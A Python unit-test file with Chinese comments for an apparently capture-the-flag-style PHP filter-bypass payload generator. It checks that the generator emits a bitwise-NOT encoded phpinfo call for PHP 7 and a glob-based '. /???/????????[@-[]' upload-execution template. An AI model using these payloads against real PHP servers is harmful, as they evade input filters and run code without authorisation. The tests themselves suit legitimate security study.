import sys
import os
import unittest

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from src import bypass

class TestPHPVersions(unittest.TestCase):
    def test_php5_restrictions(self):
        """测试在低版本模式下会过滤高版本专属载荷。"""
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=5.6
        )
        payloads = bypass.generate_candidates(options)
        
        # 验证不存在高版本专属载荷（如 (~...)(...)）
        for p in payloads:
            # 当前逻辑会过滤以 "(" 开头且以 ");" 结尾的载荷
            if p.startswith("(") and p.endswith(");"):
                self.fail(f"Found PHP7 payload in PHP5 mode: {p}")
                
    def test_php7_features(self):
        """测试在高版本模式下包含高版本专属载荷。"""
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=7.4
        )
        payloads = bypass.generate_candidates(options)
        
        # 验证存在高版本专属载荷
        # 该表达式对应目标函数调用
        found = False
        target = "(~%8F%97%8F%96%91%99%90)();"
        for p in payloads:
            if target in p:
                found = True
                break
        self.assertTrue(found, f"PHP7 payload {target} not found in PHP7 mode")

    def test_upload_exec_templates(self):
        """测试已生成新的 eg.md 模板。"""
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=True,  # 这会触发上传执行模板
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=5.6
        )
        payloads = bypass.generate_candidates(options)
        
        # 验证 . /???/????????[@-[] 存在
        found = False
        target = ". /???/????????[@-[]"
        for p in payloads:
            if target in p:
                found = True
                break
        self.assertTrue(found, f"Upload Exec template {target} not found")

if __name__ == '__main__':
    unittest.main()
